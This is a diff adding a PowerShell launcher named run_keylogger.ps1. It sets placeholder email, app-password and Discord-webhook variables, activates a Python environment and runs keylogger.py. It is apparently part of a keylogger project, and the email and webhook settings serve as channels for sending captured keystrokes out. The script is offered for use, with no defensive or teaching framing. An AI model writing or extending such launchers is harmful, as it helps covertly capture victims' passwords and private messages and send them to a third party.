@@ -1,0 +1,11 @@
+# run_keylogger.ps1
+
+# Set variables
+$env:EMAIL = "youremail@gmail.com"
+$env:APP_PASSWORD = "your app password here"
+$env:DISCORD_WEBHOOK = "https://discord.com/api/webhooks/your-hook-url"
+
+# Activate virtual environment
+.\env\Scripts\Activate.ps1
+
+python keylogger.py
